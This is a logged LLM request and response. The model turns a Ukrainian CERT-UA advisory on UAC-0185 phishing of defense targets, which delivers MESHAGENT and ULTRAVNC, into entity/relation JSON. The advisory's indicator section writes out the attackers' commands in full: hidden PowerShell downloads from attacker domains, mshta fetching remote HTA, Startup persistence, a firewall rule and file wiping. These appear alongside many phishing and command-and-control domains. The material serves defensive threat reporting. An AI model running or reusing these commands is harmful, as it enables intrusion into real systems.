@@ -1,0 +1,506 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Vulnerability: A flaw or weakness in software, hardware, or a system that can be exploited to compromise security. (also: Security Flaw, Security Vulnerability)
+- Software Product: A program, application, operating system, or software component designed for end users or computing systems. (also: Software Application, Software Program, Software)
+- Technology Vendor: A company or organization that develops, manufactures, or supplies software, hardware, or technology services. (also: Software Vendor, Vendor, Technology Company)
+- Country: A sovereign nation, state, or distinct territorial body with its own government. (also: Nation, Sovereign State)
+- Government Agency: An official institution, ministry, department, or administrative body operating under the authority of a national or regional government. (also: Government Body, Government Organization, State Authority)
+- Malware: Software, code, or executable files intentionally designed to disrupt, damage, or gain unauthorized access to computer systems or data. (also: Malicious Software, Malware Family, Malware Strain)
+- Uniform Resource Locator: A standardized web address identifying the location of a specific resource or endpoint on a computer network. (also: URL, Web Address, Link)
+- Person: An individual human being, such as a government official, cybersecurity professional, diplomat, or other public figure. (also: Individual, Human)
+- IP Address: A numerical label assigned to a device or network interface to identify its location on a computer network. (also: Internet Protocol Address)
+- Email Address: A unique identifier used to send and receive electronic mail messages over a computer network. (also: E-mail Address, Email)
+- Computer File: A digital file, script, document, or archive stored on a filesystem or transmitted across a network. (also: File, Digital File)
+- Company: A commercial business, corporation, or enterprise operating within a specific industry or market. (also: Commercial Enterprise, Business, Corporation)
+- Domain Name: A unique identification string that defines a realm of administrative autonomy, authority, or control within the Internet. (also: Internet Domain, Domain, Fully Qualified Domain Name)
+- Threat Actor: An individual or organized group responsible for conducting malicious cyber activities, attacks, or espionage campaigns. (also: Threat Group, Hacker Group, Advanced Persistent Threat)
+
+### KNOWN RELATION TYPES ###
+- publishes-advisory: The subject vendor or organization releases or issues a security advisory or patch update.
+- fixes-vulnerability-in: The subject security advisory or update remediates vulnerabilities found in the object software product.
+- affects: The subject vulnerability or malware impacts, targets, or compromises the object software, system, or organization.
+- located-in: The subject entity is based in, operates within, or belongs to the object country or geographic area.
+- part-of: The head entity is a component, sub-application, or structural member of the tail entity.
+- hosts: The subject network infrastructure, host, or server hosts or provides access to the object resource or payload.
+- delivers: The subject malware, file, or campaign installs, drops, or initiates the execution of the object malware payload.
+- redirects-to: The subject script, webpage, or file redirects user traffic or execution to the object URL or host.
+- exploits: The subject threat actor or malware leverages or abuses the object security vulnerability to compromise systems.
+- uses: The subject threat actor or malware utilizes the object tool, infrastructure, or malware.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA 04.12.2024 від фахівців MIL.CERT-UA отримано інформацію щодо розповсюдження електронних листів з темою "до уваги_змiни_02-1-437 вiд 04.12.2024р.", нібито, від імені Українського союзу промисловців та підприємців (УСПП) із запрошенням на конференцію, присвячену тематиці переходу продукції ОПК України на технічні стандарти НАТО, що проводилася в м.Києві 05.12.2024 у змішаному форматі.</p><p>При цьому, в листі містилося гіперпосилання "Вкладення містить важливу інформацію для вашої участі.", у разі переходу за яким на комп'ютер жертви буде завантажено файл-ярлик "лист_02-1-437.lnk". Відкриття LNK-файлу призведе до завантаження і запуску за допомогою штатної утиліти mshta.exe файлу "start.hta". Згаданий HTA-файл містить JavaScript-код, призначений для запуску двох PowerShell-команд, одна з яких здійснить завантаження і вікдриття файлу-приманки у вигляді листа УСПП, а друга - завантаження файлу "Front.png", що є ZIP-архівом, в якому знаходяться три файли: "Main.bat", "Registry.hta" та "update.exe", видобування вмісту архіву до каталогу "%LOCALAPPDATA%\Microsoft\EdgeUpdate\Update\" і запуск BAT-файлу "Main.bat".</p><p>Останній забезпечить переміщення файлу "Registry.hta" в каталог автозапуску, його виконання, а також видалення з комп'ютера частини завантажених файлів.</p><p>Насамкінець "Registry.hta" запустить "update.exe", який класифіковано як програму віддаленого керування MESHAGENT.</p><p>В процесі дослідження додатково виявлено файли та інфраструктуру, які використовувалися в кібератаках з початку 2023 року.</p><p>Загалом, активність UAC-0185 (UNC4221) здійснюється, щонайменше, з 2022 року. Основною спрямованістю угрупування є викрадення облікових даних месенджерів "Signal", "Telegram", "WhatsApp" та військових систем "DELTA", "ТЕНЕТА", "Кропива". Разом з тим, більш обмежено здійснюються кібератаки, що мають на меті отримання несанкціонованого віддаленого доступу до ЕОМ співробітників підприємств оборонно-промислового комплексу, а також Сил оборони України з використанням спеціалізованих програмних засобів, зокрема, MESHAGENT та ULTRAVNC.</p><p><br></p><p><strong>Індикатори кіберзагроз</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">4f8e66f060ea918637b5e2dfe7fff16d&nbsp;&nbsp;&nbsp; e763ba973e455e684cba6649461e41f488a4a041b23442846c82c532e3a78806&nbsp;&nbsp;&nbsp; лист_02-1-437.lnk
+a5b1a7db7abf94163a2871d0d7359b49&nbsp;&nbsp;&nbsp; bf576d4fcbecdff07f71af2ace12cc53a2e03b16c464d4aefb393c4e719ddb17&nbsp;&nbsp;&nbsp; start.hta
+92b698f674370120ec399ad47600477b&nbsp;&nbsp;&nbsp; 1ffcc81d9194d3f84c9056db6833c99182d0c47f501134cf11a7e20f76dd0833&nbsp;&nbsp;&nbsp; Back.png
+104cd6e96a9898462335b0e63766a983&nbsp;&nbsp;&nbsp; d2d5052b0c703a8b148aa6446d1a199aa59c590c5b534e45b03f1e8e74338c2b&nbsp;&nbsp;&nbsp; Front.png
+34d1bd73883fd4b1709f4a41af70a192&nbsp;&nbsp;&nbsp; 6669f6cff75f27db3580ab76e4391245f8028c671198174a4ab0abbfc217f27c&nbsp;&nbsp;&nbsp; Registry.hta
+7b7ccd7899b0b3b52398df45faf85078&nbsp;&nbsp;&nbsp; 689c7b5a63740593af5f931edccd04e5a0af4592f2159da1dc6ff9fb85724d6d&nbsp;&nbsp;&nbsp; Main.bat
+4dbd1ced8da2a4acec15cfd9be73bfcc&nbsp;&nbsp;&nbsp; 831548a4bf76e77acb9858fffd2bb9a03b210f04f2b615b916e1a086e5421202&nbsp;&nbsp;&nbsp; update.exe (MESHAGENT)
+
+bbb96f2781bc16813af398d4a1c5867a&nbsp;&nbsp;&nbsp; 6c8ff9dde75352c94afac0045c6fecc5c27181a941c371d165be5dc6f167969c&nbsp;&nbsp;&nbsp; Front.png
+80ad42b66b4fc841bfa4210e23a2e757&nbsp;&nbsp;&nbsp; 6f4a305a1f5dbb11341986ad354aa5226afcb67b464d4914d9b3ec0c6cf7d887&nbsp;&nbsp;&nbsp; rr.vbs
+c15e1d4892f10a62fec973d37805cc65&nbsp;&nbsp;&nbsp; de66a95291321c8877b1c403357147d0c636c1e69f487579f8a2978a7ad7e2eb&nbsp;&nbsp;&nbsp; ultravnc.ini
+99a0a704c31e84b0e8cb04c0f5ac2746&nbsp;&nbsp;&nbsp; cb86993c83c30cd96c8b8fccd5236e5b5949ed400404c33ab74f173f7a9d53b9&nbsp;&nbsp;&nbsp; gnv.exe (ULTRAVNC)
+5883b5f221a9cb9dcdb4d7be923d4d98&nbsp;&nbsp;&nbsp; 57f5d4e69fb409ca448dcf7c281e130c66aff37178c827c4bdd6eebace0145e4&nbsp;&nbsp;&nbsp; Main.bat
+e4d2f6d160ed8e4a2abd024dc9385ae1&nbsp;&nbsp;&nbsp; 71a27bc19cd4c3af587071d97afe205f1224f8a71d668683d1fba1969ea241a3&nbsp;&nbsp;&nbsp; start.bat
+882e5e17793b84ba2705b0e296777635&nbsp;&nbsp;&nbsp; ff9002de29b7037bcf2d496a04df98aea4e8f81f88edf409cb65173e3cc194bd&nbsp;&nbsp;&nbsp; update.lnk
+490450f5d2f1cb617e02366bc389bb7b&nbsp;&nbsp;&nbsp; 44cdc03e755bf1e7e60b460ab70834f44f7e4e9cb28591ffab99ca1517687ab2&nbsp;&nbsp;&nbsp; OnedriveAgent.exe (MESHAGENT)
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update
+%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Main.bat
+%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Registry.hta
+%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\update.exe
+%HOMEDRIVE%%HOMEPATH%\Downloads\20241288346.pdf
+%HOMEDRIVE%%HOMEPATH%\Main.zip
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Registry.hta
+%LOCALAPPDATA%\Microsoft\EdgeUpdate\Update\
+%LOCALAPPDATA%\Microsoft\EdgeUpdate\Update\Main.bat
+%LOCALAPPDATA%\Microsoft\EdgeUpdate\Update\Registry.hta
+%LOCALAPPDATA%\Microsoft\EdgeUpdate\Update\update.exe
+%USERPROFILE%\Downloads\20241288346.pdf
+%USERPROFILE%\Main.zip
+powershell.exe . mshta hXXps://device.redirecl[.]com/yS558pd/start.hta
+mshta.exe hXXps://device.redirecl[.]com/yS558pd/start.hta
+cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest hXXps://mail.outloolc[.]com/yS558pd/Back.png -OutFile %HOMEDRIVE%%HOMEPATH%\Downloads\20241288346.pdf" &amp;&amp; start %HOMEDRIVE%%HOMEPATH%\Downloads\20241288346.pdf
+cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest hXXps://mail.outloolc[.]com/yS558pd/Front.png -OutFile %HOMEDRIVE%%HOMEPATH%\Main.zip; Expand-Archive -LiteralPath %HOMEDRIVE%%HOMEPATH%\Main.zip -Destinationpath %HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update" &amp;&amp; start /b %HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Main.bat
+Expand-Archive -LiteralPath %HOMEDRIVE%%HOMEPATH%\Main.zip -Destinationpath %HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update"
+cmd.exe /c %HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\update.exe run
+copy "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Registry.hta" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Registry.hta"
+start "" "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Registry.hta"
+start %HOMEDRIVE%%HOMEPATH%\Downloads\20240188346.pdf
+del /s /q "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Main.bat"
+del /s /q "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Registry.hta"
+del /s /q "%HOMEDRIVE%%HOMEPATH%\Downloads\*.zip"
+del /s /q "%HOMEDRIVE%%HOMEPATH%\Main.zip"
+mkdir "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update"
+rmdir /s /q "%systemdrive%\$Recycle.bin"
+
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Update.lnk
+%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Update.lnk
+%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\gnv.exe
+%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\rr.vbs
+del /s /q "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\Update.lnk"
+del /s /q "%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\rr.vbs"
+del /s /q "%HOMEDRIVE%%HOMEPATH%\SS.bat"
+netsh advfirewall firewall add rule name="vnc" dir=in program=%HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\gnv.exe action=allow protocol=TCP localport=443
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest hXXps://plntr.account-viewer[.]com/xS43HI3D/Back.png -OutFile %HOMEDRIVE%%HOMEPATH%\Downloads\20240188346.pdf"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest hXXps://plntr.account-viewer[.]com/xS43HI3D/Front.png -OutFile %HOMEDRIVE%%HOMEPATH%\Main.zip
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "start %HOMEDRIVE%%HOMEPATH%\AppData\Local\Microsoft\EdgeUpdate\Update\rr.vbs"
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">mititarycua@gmail[.]com
+hXXps://live.outloolc[.]com/mail_inbox=a098m
+(smb)://device.redirecl[.]com/davwwwroot/downloads/лист_02-1-437.lnk
+hXXps://device.redirecl[.]com/yS558pd/start.hta
+hXXps://mail.outloolc[.]com/yS558pd/Back.png
+hXXps://mail.outloolc[.]com/yS558pd/Front.png
+hXXp://svc.odwebp[.]com:443/agent.ashx
+(wss)://svc.odwebp[.]com:443/agent.ashx
+146[.]59.102.122
+185[.]158.248.104
+live.outloolc[.]com
+mail.outloolc[.]com
+device.redirecl[.]com
+svc.odwebp[.]com
+uspp.derzhposluhy[.]com
+odwebp[.]com
+outloolc[.]com
+redirecl[.]com
+derzhposluhy[.]com
+
+i-ua.account-guard[.]site
+telegram.defender-bot[.]site
+telegram.token-defender[.]cloud
+account-guard[.]site
+defender-bot[.]site
+token-defender[.]cloud
+
+(tcp)://mirotrent[.]com:443
+(tcp)://plntr.mirotrent[.]com:443
+hXXps://cloud.account-viewer[.]com/tW018lIK/16_01.zip
+hXXps://get.god-le[.]com/hS483kf/Dack.png
+hXXps://get.god-le[.]com/hS483kf/Front.png
+hXXps://get.god-le[.]com/Gm912cj/icon.png
+hXXps://plntr.account-viewer[.]com/xS43HI3D/logo.png
+hXXps://plntr.account-viewer[.]com/xS43HI3D/Back.png
+hXXps://plntr.account-viewer[.]com/xS43HI3D/Front.png
+136[.]243.237.26
+5[.]181.156.72
+account-viewer[.]com
+god-le[.]com
+god-le[.]net
+in-touc[.]com
+mail-gov[.]com
+mail-gov[.]net
+sign-cert[.]com
+mirotrent[.]com
+palantir[.]ink
+clouddrive[.]world
+emtserviceca[.]info
+account-saver[.]com
+mails[.]support
+check.sign-cert[.]com
+cloud.account-viewer[.]com
+cloud.god-le[.]net
+confirm.account-viewer[.]com
+device.redirecl[.]com
+dhl.redirecl[.]com
+drive.redirecl[.]com
+get.god-le[.]com
+get.in-touc[.]com
+get.mail-gov[.]com
+get.sign-cert[.]com
+ivanti.account-viewer[.]com
+plntr.mirotrent[.]com
+my.mail-gov[.]net
+plntr.account-viewer[.]com
+stellar.account-viewer[.]com
+
+Додаткові індикатори за більш ранні періоди
+2022-09-12:
+74f6bd1a80ebfeece1e65b441c2f46e2
+delta_1.0.0.apk
+hXXp://185[.]225.35.75:30555/cc
+185[.]225.35.75
+217[.]144.102.219
+45[.]147.179.185
+46[.]30.44.144
+62[.]113.110.100
+cancel-auth[.]site
+confirmphone[.]site
+milgov[.]host
+milgov[.]site
+teiegram[.]host
+telegram-account[.]host
+telegram-auth[.]website
+telegramm-account[.]site
+web-telegram[.]host
+delta.milgov[.]site
+web.teiegram[.]host
+web.telegram-account[.]host
+web.telegramm-account[.]site
+web.web.telegram-account[.]host
+www.teiegram[.]host
+www.telegram-auth[.]website
+www.telegramm-account[.]site
+212nj0b42w.web.telegram-account[.]host
+658pvbhj2k7veemmv4.web.telegram-account[.]host
+spam.web-telegram[.]host
+hXXp://185[.]225.35.75:30555/cc
+hXXps://delta.milgov[.]site/
+hXXps://web.telegram-account[.]host/
+hXXps://web.telegram-account[.]host/#/login
+
+2024-01-16:
+176[.]57.212.217
+193[.]203.202.168
+217[.]151.229.29
+kropyva[.]group
+kropyva[.]site
+teneta[.]group
+teneta[.]site
+group-teneta[.]online
+group.kropyva[.]site
+group.teneta[.]site
+(wss)://kropyva[.]group/qr
+hXXps://group-teneta[.]online/
+hXXps://group.teneta[.]site/
+hXXps://kropyva[.]group/
+
+2024-03-29:
+whatsapp-confirm[.]site
+passport-ukr-net[.]site
+protect-password[.]site
+telegram-confirm[.]site
+accept-action[.]site
+signal-confirm[.]site
+cancel-action[.]site
+drive-share[.]site
+share-drive[.]site
+group-invitation[.]site
+check-active[.]site
+qweasdzx[.]site
+qsrgh[.]site
+www.protect-password[.]site
+www.confirm-signal[.]site
+www.google-drive[.]site
+www.signal-confirm[.]site
+www.qsrgh[.]site
+www.accept-action[.]site
+whatsapp.protect-password[.]site
+telegram.check-active[.]site
+whatsapp.group-invitation[.]site
+google.drive-share[.]site
+google.share-drive[.]site
+telegram.qweasdzx[.]site
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження</p>
+
+=== RESPONSE (10.9s, in 7007 / out 2464 tok, STOP) ===
+UAC-0185 (UNC4221) conducted a cyberattack campaign targeting Ukrainian defense industrial complex enterprises and the Defense Forces of Ukraine. The attackers sent phishing emails impersonating the Ukrainian League of Industrialists and Entrepreneurs (USPP) with links leading to malicious LNK files, HTA scripts, and multi-stage droppers deploying remote management software such as MESHAGENT and ULTRAVNC, alongside credential harvesting targeting military and communication systems.
+
+```json
+{
+  "entities": [
+    {
+      "name": "MIL.CERT-UA",
+      "kind": "Government Agency",
+      "gloss": "The computer emergency response team of the Ministry of Defence of Ukraine."
+    },
+    {
+      "name": "Україна",
+      "kind": "Country",
+      "gloss": "A sovereign state in Eastern Europe."
+    },
+    {
+      "name": "Український союз промисловців та підприємців",
+      "kind": "Company",
+      "gloss": "A Ukrainian non-governmental organization and business association representing industrial and commercial enterprises."
+    },
+    {
+      "name": "НАТО",
+      "kind": "Government Agency",
+      "gloss": "An intergovernmental military alliance consisting of 32 member states."
+    },
+    {
+      "name": "UAC-0185",
+      "kind": "Threat Actor",
+      "gloss": "A threat actor group, also tracked as UNC4221, targeting Ukrainian defense entities, messaging apps, and military systems."
+    },
+    {
+      "name": "UNC4221",
+      "kind": "Threat Actor",
+      "gloss": "An alias for the threat actor group tracked by CERT-UA as UAC-0185."
+    },
+    {
+      "name": "Signal",
+      "kind": "Software Product",
+      "gloss": "A cross-platform centralized encrypted instant messaging service."
+    },
+    {
+      "name": "Telegram",
+      "kind": "Software Product",
+      "gloss": "A cloud-based, cross-platform instant messaging service."
+    },
+    {
+      "name": "WhatsApp",
+      "kind": "Software Product",
+      "gloss": "An instant messaging and voice-over-IP service owned by Meta."
+    },
+    {
+      "name": "DELTA",
+      "kind": "Software Product",
+      "gloss": "A Ukrainian military situational awareness and battlefield management system."
+    },
+    {
+      "name": "ТЕНЕТА",
+      "kind": "Software Product",
+      "gloss": "A Ukrainian military communications and information system."
+    },
+    {
+      "name": "Кропива",
+      "kind": "Software Product",
+      "gloss": "A Ukrainian proprietary combat tactical management system for artillery and intelligence units."
+    },
+    {
+      "name": "Сили оборони України",
+      "kind": "Government Agency",
+      "gloss": "The unified military defense forces of Ukraine."
+    },
+    {
+      "name": "MESHAGENT",
+      "kind": "Malware",
+      "gloss": "A remote management agent software misused by threat actors for remote command and control."
+    },
+    {
+      "name": "ULTRAVNC",
+      "kind": "Software Product",
+      "gloss": "An open-source remote administration and screen-sharing tool."
+    },
+    {
+      "name": "mshta.exe",
+      "kind": "Software Product",
+      "gloss": "A legitimate Microsoft Windows utility used to execute Microsoft HTML Application files."
+    },
+    {
+      "name": "лист_02-1-437.lnk",
+      "kind": "Computer File",
+      "gloss": "A malicious Windows shortcut file that initiates an infection chain by executing an HTA script."
+    },
+    {
+      "name": "start.hta",
+      "kind": "Computer File",
+      "gloss": "An HTML application file containing malicious JavaScript code to launch PowerShell commands."
+    },
+    {
+      "name": "Front.png",
+      "kind": "Computer File",
+      "gloss": "A malicious ZIP archive disguised as a PNG image containing dropper scripts and executables."
+    },
+    {
+      "name": "Main.bat",
+      "kind": "Computer File",
+      "gloss": "A batch script that executes persistence and cleanup operations during the infection."
+    },
+    {
+      "name": "Registry.hta",
+      "kind": "Computer File",
+      "gloss": "An HTA file placed in the Windows Startup folder to maintain persistence and launch payloads."
+    },
+    {
+      "name": "update.exe",
+      "kind": "Computer File",
+      "gloss": "An executable payload classified as the MESHAGENT remote management program."
+    },
+    {
+      "name": "gnv.exe",
+      "kind": "Computer File",
+      "gloss": "An executable component corresponding to ULTRAVNC remote access tool."
+    },
+    {
+      "name": "mititarycua@gmail[.]com",
+      "kind": "Email Address",
+      "gloss": "An email address used by threat actors in cyberattack operations."
+    },
+    {
+      "name": "device.redirecl[.]com",
+      "kind": "Domain Name",
+      "gloss": "A malicious domain used to host HTA files and shortcut payloads."
+    },
+    {
+      "name": "mail.outloolc[.]com",
+      "kind": "Domain Name",
+      "gloss": "A spoofed domain used to distribute malicious archives and decoy documents."
+    },
+    {
+      "name": "svc.odwebp[.]com",
+      "kind": "Domain Name",
+      "gloss": "A malicious domain hosting MESHAGENT command and control endpoints."
+    },
+    {
+      "name": "uspp.derzhposluhy[.]com",
+      "kind": "Domain Name",
+      "gloss": "A spoofed domain impersonating the Ukrainian League of Industrialists and Entrepreneurs."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0185",
+      "type": "uses",
+      "tail": "MESHAGENT",
+      "evidence": "Сил оборони України з використанням спеціалізованих програмних засобів, зокрема, MESHAGENT"
+    },
+    {
+      "head": "UAC-0185",
+      "type": "uses",
+      "tail": "ULTRAVNC",
+      "evidence": "Сил оборони України з використанням спеціалізованих програмних засобів, зокрема, MESHAGENT та ULTRAVNC"
+    },
+    {
+      "head": "UAC-0185",
+      "type": "affects",
+      "tail": "Сили оборони України",
+      "evidence": "отримання несанкціонованого віддаленого доступу до ЕОМ співробітників підприємств оборонно-промислового комплексу, а також Сил оборони України"
+    },
+    {
+      "head": "лист_02-1-437.lnk",
+      "type": "delivers",
+      "tail": "start.hta",
+      "evidence": "Відкриття LNK-файлу призведе до завантаження і запуску за допомогою штатної утиліти mshta.exe файлу \"start.hta\""
+    },
+    {
+      "head": "start.hta",
+      "type": "delivers",
+      "tail": "Front.png",
+      "evidence": "друга - завантаження файлу \"Front.png\", що є ZIP-архівом"
+    },
+    {
+      "head": "Front.png",
+      "type": "delivers",
+      "tail": "Main.bat",
+      "evidence": "ZIP-архівом, в якому знаходяться три файли: \"Main.bat\", \"Registry.hta\" та \"update.exe\""
+    },
+    {
+      "head": "Front.png",
+      "type": "delivers",
+      "tail": "Registry.hta",
+      "evidence": "ZIP-архівом, в якому знаходяться три файли: \"Main.bat\", \"Registry.hta\" та \"update.exe\""
+    },
+    {
+      "head": "Front.png",
+      "type": "delivers",
+      "tail": "update.exe",
+      "evidence": "ZIP-архівом, в якому знаходяться три файли: \"Main.bat\", \"Registry.hta\" та \"update.exe\""
+    },
+    {
+      "head": "Registry.hta",
+      "type": "delivers",
+      "tail": "update.exe",
+      "evidence": "Насамкінець \"Registry.hta\" запустить \"update.exe\""
+    },
+    {
+      "head": "update.exe",
+      "type": "part-of",
+      "tail": "MESHAGENT",
+      "evidence": "\"update.exe\", який класифіковано як програму віддаленого керування MESHAGENT"
+    },
+    {
+      "head": "device.redirecl[.]com",
+      "type": "hosts",
+      "tail": "start.hta",
+      "evidence": "mshta.exe hXXps://device.redirecl[.]com/yS558pd/start.hta"
+    },
+    {
+      "head": "mail.outloolc[.]com",
+      "type": "hosts",
+      "tail": "Front.png",
+      "evidence": "Invoke-WebRequest hXXps://mail.outloolc[.]com/yS558pd/Front.png"
+    },
+    {
+      "head": "MIL.CERT-UA",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "отримано інформацію щодо розповсюдження електронних листів"
+    },
+    {
+      "head": "Український союз промисловців та підприємців",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Українського союзу промисловців та підприємців (УСПП)"
+    },
+    {
+      "head": "Сили оборони України",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Сил оборони України"
+    }
+  ],
+  "newRelationTypes": []
+}
+```
